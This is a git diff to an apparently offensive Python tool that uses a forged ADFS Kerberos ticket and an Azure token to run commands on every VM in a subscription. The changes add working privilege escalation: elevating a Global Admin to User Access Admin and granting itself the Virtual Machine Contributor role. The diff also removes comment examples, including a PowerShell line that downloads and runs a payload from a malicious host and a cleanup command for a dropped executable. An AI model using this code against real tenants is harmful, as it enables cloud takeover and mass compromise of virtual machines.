@@ -15,6 +15,7 @@
 # limitations under the License.
 
 import sys
+import jwt
 import signal
 import random
 import asyncio
@@ -23,6 +24,7 @@ import argparse
 import requests
 import concurrent.futures
 import concurrent.futures.thread
+from uuid import uuid4
 from time import sleep
 from typing import Dict
 from functools import partial
@@ -85,22 +87,16 @@ def get_args():
         required=True,
     )
     p.add_argument(
+        "--adfs-account",
+        type=str,
+        help="ADFS Service Account Name or Local Admin Account Name of the ADFS Server",
+	required=True,
+    )
+    p.add_argument(
         "--rate",
         type=int,
         default=5,
         help="Number of threads to run concurrently. Default: 5",
-    )
-    p.add_argument(
-        "--malicious-host",
-        type=str,
-        help="IP address/domain name of the malicious server hosting payloads",
-        required=True,
-    )
-    p.add_argument(
-        "--payload-name",
-        type=str,
-        help="Name of remote payload file",
-        required=True,
     )
     p.add_argument(
         "--command",
@@ -122,8 +118,16 @@ class ShockNAwe:
         self.loop = loop
         self.access_token = access_token
         self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=rate)
-        # On init, get subscription ID and VMS
+        # On init:
+        # Elevater user to User Access Admin
+        self._elevate_to_user_access_admin()
+        # Get Subscription ID
         self._get_subscription_id()
+        # Get Role ID for Virtual Machine Contributor
+        self._get_role_assignment_id()
+        # Grant Virtual Machine Contributor role to user
+        self._grant_virtual_machine_contributor_role()
+        # Enumerate VMs in Subscription
         self._get_vms()
 
     def shutdown(self, key: bool = False):
@@ -140,6 +144,15 @@ class ShockNAwe:
         atexit.unregister(concurrent.futures.thread._python_exit)
         self.executor.shutdown = lambda wait: None
 
+    def _elevate_to_user_access_admin(self) -> str:
+        """Elevate Global Admin to User Access Admin"""
+        logging.info("[ * ] Elevating Global Admin to User Access Admin")
+
+        url = "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2015-07-01"
+        headers = {"Authorization": f"Bearer {self.access_token}"}
+        data = requests.post(url, headers=headers)
+        logging.info(f"\tUser Elevated!")
+
     def _get_subscription_id(self) -> str:
         """Retrieve an Azure subscription ID"""
         logging.info("[ * ] Extracting Azure subscription ID")
@@ -153,6 +166,34 @@ class ShockNAwe:
 
         logging.info(f"\tAzure Subscription ID: {subscription_id}")
         self.subscription_id = subscription_id
+
+    def _get_role_assignment_id(self) -> str:
+        """Get Role Assigmnet ID of Virtual Contributor Role"""
+        logging.info("[ * ] Obtaining Assignment Role ID for Virtual Machine Contributor Role")
+
+        url = f"https://management.azure.com/subscriptions/{self.subscription_id}/providers/Microsoft.Authorization/roleDefinitions?$filter=roleName eq 'Virtual Machine Contributor'&api-version=2018-01-01-preview"
+        headers = {"Authorization":f"Bearer {self.access_token}"}
+        data = requests.get(url, headers=headers).json()
+        self.role_id = data['value'][0]['name']
+        logging.info(f"\tVirtual Machine Contributor Role ID: {self.role_id}")
+
+    def _grant_virtual_machine_contributor_role(self) -> str:
+        logging.info("[ * ] Granting Ourselves Virtual Machine Contributor Permissions")
+
+        url = f"https://management.azure.com/subscriptions/{self.subscription_id}/providers/Microsoft.Authorization/roleAssignments/{str(uuid4())}?api-version=2018-09-01-preview"
+        headers = {"Authorization": f"Bearer {self.access_token}", "Content-Type": "application/json"}
+        decoded_token = jwt.decode(self.access_token, options = {"verify_signature":False})
+        user_id = decoded_token['oid']
+        body = {
+          "properties": {
+            "roleDefinitionId": f"/subscriptions/{self.subscription_id}/providers/Microsoft.Authorization/roleDefinitions/{self.role_id}",
+            "principalId": f"{user_id}",
+            "canDelegate": "false"
+          }
+        }
+        response = requests.put(url, headers=headers, json=body).json()
+
+        logging.info(f"\tResponse: {response}")
 
     def _get_vms(self) -> Dict:
         """Enumerate VMs in an Azure subscription"""
@@ -237,6 +278,11 @@ class ShockNAwe:
                 == "The operation requires the VM to be running (or set to run)."
             ):
                 logging.warning(f"[ ! ] {server} - Status: Server is not running")
+                return None
+            elif (
+                data['error']['message']
+            ):
+                logging.warning(f"[ ! ] {server} - {data['error']['message']}")
                 return None
         except:
             # Perform status checks on the payload deployment
@@ -324,8 +370,7 @@ if __name__ == "__main__":
     (krb_ticket, cipher, sessionKey) = create_ticket(
         domain=args.domain,
         host=args.adfs_host,
-        user=args.domain_username,
-        user_password=args.domain_password,
+        user=args.adfs_account,
         domain_username=args.domain_username,
         domain_password=args.domain_password,
         dc_ip=args.dc_ip,
@@ -376,15 +421,7 @@ if __name__ == "__main__":
         rate=args.rate,
     )
 
-    mal_host = args.malicious_host
-    payload_name = args.payload_name
     command = args.command.split(",")
-
-    # Example Command
-    # command = [f"IEX((New-Object Net.WebClient).DownloadString('http://{mal_host}/{payload_name}'))"]
-
-    # Cleanup Example
-    # command = ["del C:\Windows\Tasks\MpCmdRun3.exe"]
 
     logging.info(
         f"[ * ] Running command '{' '.join(command)}' on all VM's in the Azure subcription"
